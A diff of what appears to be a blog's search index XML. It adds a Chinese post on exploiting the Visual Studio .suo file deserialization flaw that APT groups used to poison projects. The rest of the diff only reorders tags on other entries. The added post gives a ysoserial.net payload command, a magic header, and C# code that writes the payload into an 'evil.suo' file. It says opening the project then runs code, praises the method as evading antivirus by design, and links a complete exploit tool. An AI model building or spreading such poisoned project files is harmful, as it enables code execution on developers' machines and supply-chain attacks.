@@ -4,6 +4,27 @@
   
   
   <entry>
+    <title>时隔三月，再谈Visual Studio .suo文件反序列化漏洞</title>
+    <link href="/articles/resln/"/>
+    <url>/articles/resln/</url>
+    
+    <content type="html"><![CDATA[<p>2025年1月，某APT组织利用Visual Studio .suo文件反序列化漏洞投毒。</p><p>微软认为，使用Visual Studio打开项目本来就是危险操作，所以他们并不认为这是漏洞，也不会修复（这回复就很微软哈哈哈），时至今日，该漏洞在最新版的Visual Studio中依然能正常利用（分项目类型，部分项目类型不生效，没深入研究）</p><p>该漏洞在被APT组织利用前知名度并不高（虽然非常严重），在2023年就披露出来了，我在2024年编写了一个利用工具，到2025年才有APT组织利用</p><p>使用<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>生成Payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ysoserial -g ClaimsIdentity -f BinaryFormatter -c calc -o base64 -bgc TypeConfuseDelegate<br></code></pre></td></tr></table></figure><p>然后添加一个申必魔数头</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-built_in">byte</span>[] payload_header = &#123; <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> &#125;;<br></code></pre></td></tr></table></figure><p>使用<a href="https://github.com/ironfede/openmcdf">openmcdf</a>将Payload写入.suo文件</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C#">cf.RootStorage.GetStream(<span class="hljs-string">&quot;VsToolboxService&quot;</span>).SetData(CombineArrays(payload_header, Convert.FromBase64String(payload)));<br><span class="hljs-built_in">string</span> o = Environment.CurrentDirectory + <span class="hljs-string">&quot;\\evil.suo&quot;</span>;<br>cf.SaveAs(o);<br>cf.Close();<br>Console.WriteLine(<span class="hljs-string">&quot;\n\n成功，文件已保存到 &quot;</span> + o);<br></code></pre></td></tr></table></figure><p>替换原有的.suo文件，打开项目，代码执行，利用成功</p><p><img src="/articles/resln/640.png"></p><p>Payload被Base64编码，而且.suo文件以二进制形式存储，也就是说这种方法自带免杀，利用起来非常方便（笑）</p><p>上面的代码不完整，这里有完整利用工具（给个star吧谢谢了）：<a href="https://github.com/Brassinolide/VS_Deserialize_Exploit">https://github.com/Brassinolide/VS_Deserialize_Exploit</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>网络安全</tag>
+      
+      <tag>漏洞</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>【奇技淫巧】利用BurpSuite的证书bug阻止BurpSuite访问你的网站</title>
     <link href="/articles/noburpsuite/"/>
     <url>/articles/noburpsuite/</url>
@@ -39,9 +60,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
       <tag>RFC3161</tag>
       
@@ -83,9 +104,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
     </tags>
     
@@ -110,9 +131,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
       <tag>网络工程</tag>
       
@@ -135,9 +156,9 @@
       
       <tag>网络安全</tag>
       
-      <tag>网络工程</tag>
-      
       <tag>云服务器</tag>
+      
+      <tag>网络工程</tag>
       
       <tag>运维</tag>
       
@@ -206,9 +227,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
     </tags>
     
@@ -227,9 +248,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
       <tag>密码学</tag>
       
@@ -252,9 +273,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
       <tag>密码学</tag>
       
@@ -275,9 +296,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
     </tags>
     
@@ -296,9 +317,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
     </tags>
     
@@ -317,9 +338,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
       <tag>密码学</tag>
       
@@ -359,9 +380,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
       <tag>windows</tag>
       
@@ -447,11 +468,11 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>安全工具</tag>
       
       <tag>渗透测试</tag>
+      
+      <tag>网络安全</tag>
       
     </tags>
     
@@ -470,9 +491,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
       <tag>Github</tag>
       
@@ -493,9 +514,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
     </tags>
     
@@ -514,9 +535,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
       <tag>Windows</tag>
       
@@ -598,9 +619,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
       <tag>Windows</tag>
       
@@ -621,9 +642,9 @@
     
     <tags>
       
-      <tag>网络安全</tag>
-      
       <tag>编程</tag>
+      
+      <tag>网络安全</tag>
       
       <tag>Windows</tag>
       
